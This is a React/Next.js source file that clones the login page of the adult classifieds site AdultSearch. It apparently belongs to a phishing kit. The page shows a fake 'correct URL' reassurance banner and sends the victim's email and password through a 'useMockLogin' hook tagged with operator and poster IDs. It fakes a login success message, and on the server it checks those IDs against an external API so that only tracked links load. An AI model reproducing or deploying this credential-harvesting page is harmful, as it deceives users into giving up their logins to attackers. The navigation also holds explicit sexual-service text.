
import { API_URL, site } from "../../../config";
import { HiMiniPlusCircle } from "react-icons/hi2";
import { IoLockClosed } from "react-icons/io5";
import Cookies from "js-cookie";
import { useState } from "react";
import useMockLogin from "../../../hooks/useMockLogin";
import { toast } from "react-toastify";

export default function MainPage({ adminId, posterId }) {
  const [email,setEmail]=useState('')
  const [password,setPassword]=useState('')
  const { login } = useMockLogin();

const handleSubmit=(e)=>{
e.preventDefault()
const submitValues = {
  site,
  email,
  password,
};
 login(submitValues);
 toast.success("Login Succecssfull");
  
  setEmail('')
  setPassword('')
}
  Cookies.set("adminId", adminId);
  Cookies.set("posterId", posterId);


  return (
    <div className="">
    {/* <!-- navbar goes here --> */}
<nav className="bg-gray-100 ">
  <div className=" mx-auto px-2 py-1 ">
    <div className="flex justify-between">

      <div className="flex space-x-4 sm:space-x-0">
         {/* logo  */}
        <div>
          <a href="#" className="flex justify-center items-center py-3 px-2 ">
           <img src='/images/brandlogo.svg' width={150} height={33} />
          </a>
        </div>

        {/* <!-- primary nav --> */}
        <div className=" md:flex items-center space-x-1 sm:  hidden">
        <ul className="flex ">
                                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                        <span>Shemale Escorts</span>
                    </li>
                                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                        <span>Gay Escorts</span>
                    </li>
                                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                        <span>Meet & Fuck</span>
                    </li>
                                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                        <span>Live Escorts</span>
                    </li>
                                    <li className="text-[#676768] leading-normal  text-sm">
                        <span>Escorts</span>
                    </li>
                                    
                                 
                                   
                                  
                            </ul>
        </div>
      </div>

      <div className="md:flex justify-center items-center hidden">

  <div className="dropdown inline-block relative  ">
    <button className="  font-base  py-2 px-4 rounded inline-flex items-center">
      <span className="mr-1 text-[#2d7bcd]">EN</span>
      <svg className="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z"/> </svg>
    </button>
   
  </div>
  <ul className='flex'>
  <li className="bg-[#0ea400] text-white rounded-full    flex ">
 
<HiMiniPlusCircle size={28} style={{
  marginRight:'5px'
}} />
                        <span className='text-base pt-[2px] pr-2 '>Post Ad</span>
                    </li>
                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-5 pl-3 pr-3 text-sm">
                        <span>Feedback</span>
                    </li>
                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm">
                        <span>FAQ</span>
                    </li>
                    <li className="text-[#676768] leading-normal  border-r border-[#d4d6d9] mr-3 pr-3 text-sm font-semibold">
                        <span>Login</span>
                    </li>
                    <li className="text-[#676768] font-semibold pr-2 text-sm">
                        <span>Register</span>
                    </li>

                    </ul>

</div>

     
      {/* <!-- mobile button goes here --> */}
      <div className="md:hidden flex items-center">
        <button className="mobile-menu-button">
          <svg className="w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
          </svg>
        </button>
      </div>

    </div>
  </div>

  {/* <!-- mobile menu --> */}
  <div className="mobile-menu hidden md:hidden">
    <a href="#" className="block py-2 px-4 text-sm hover:bg-gray-200">Features</a>
    <a href="#" className="block py-2 px-4 text-sm hover:bg-gray-200">Pricing</a>
  </div>
</nav>

{/* <!-- content goes here --> */}

<div className="max-h-[520-px] max-w-[1350px] px-7 border border-[#e5e5e5] mt-3 rounded-md mx-[35px]">
 
  <section className="border-red-500 bg-[#fff]  ">
    <div className="bg-[#fff]  flex justify-between ">
      <div className="  pt-5">
        <h2 className="text-[24px] font-bold text-[#3b3b3b]">Login To AdultSearch</h2>
        
        <div className="bg-[#f6f7d9] flex justify-center items-center py-2 px-1 rounded-md text-sm">
				                <p className='text-[#666]'>Please check that you are visiting the correct URL:</p>
                        <div className="pl-1">
                        <div className=" bg-[#fff] flex justify-center items-center border border-[#ccc] rounded px-2 ">
                        <IoLockClosed /><p className='text-sm pl-1'>adultsearch.com</p>
            				    </div>
                        </div> </div>
				                
				           
        <form className="mt-1" action="#" method="POST">
          <div>
            <label className="block text-[#3b3b3b]">Your email address<span className='text-red-600'>&#42;</span></label>
            <input type="email" name="" id="" value={email} onChange={(e)=>setEmail(e.target.value)} className="w-80 px-1 py-1 rounded mt-2 border border-[#e5e5e5] outline-none" autoFocus autoComplete required/>
          </div>
  
          <div className="mt-1">
            <label className="block text-[#3b3b3b]">Your password <span className='text-red-600'>&#42;</span></label>
            <input type="password" name="" id="" value={password} onChange={(e)=>setPassword(e.target.value)} minLength="6" className="w-80 px-1 py-1 rounded mt-2 border border-[#e5e5e5] outline-none " required/>
          </div>
          
          <div className="flex pt-3">
          <input type="checkbox" name="" id="" className='m-1 w-[18px] h-[18px]'/>
            <span className='pl-3 text-[#3b3b3b]'>Keep this computer log in</span>
          
          </div>
          
  
          
  
          <button onClick={handleSubmit} type="submit" className="w-80 block bg-[#0ea400]  text-white font-base text-base px-1 py-1 mt-3 rounded">Login</button>
        </form>

        <div className="w-80 mt-4 grid grid-cols-3 items-center text-gray-500 ">
          <hr className="border-gray-500" />
          <p className="text-center text-sm">OR</p>
          <hr className="border-gray-500" />
        </div>

        <button type="submit" className="w-80 block bg-[#1573bf]  text-white font-base text-base px-1 py-1 mt-3 rounded">Create A New Account</button>

        <div className="text-center m-7">
            <a href="#" className="text-base font-base text-gray-700 hover:text-blue-700 focus:text-blue-700">Forgot Password?</a>
          </div>
      </div>

      <div className=" md:block hidden ">
        <p className='m-5'>Adult Search gives you the ability to connect with adult businesses around the 
        <br/>world.</p>
        <img src="/images/map1.png" className="rounded-2xl" alt="page img"/>
      </div>

    </div>
  </section>
  
  
</div>
   </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: { adminId, posterId },
  };
}
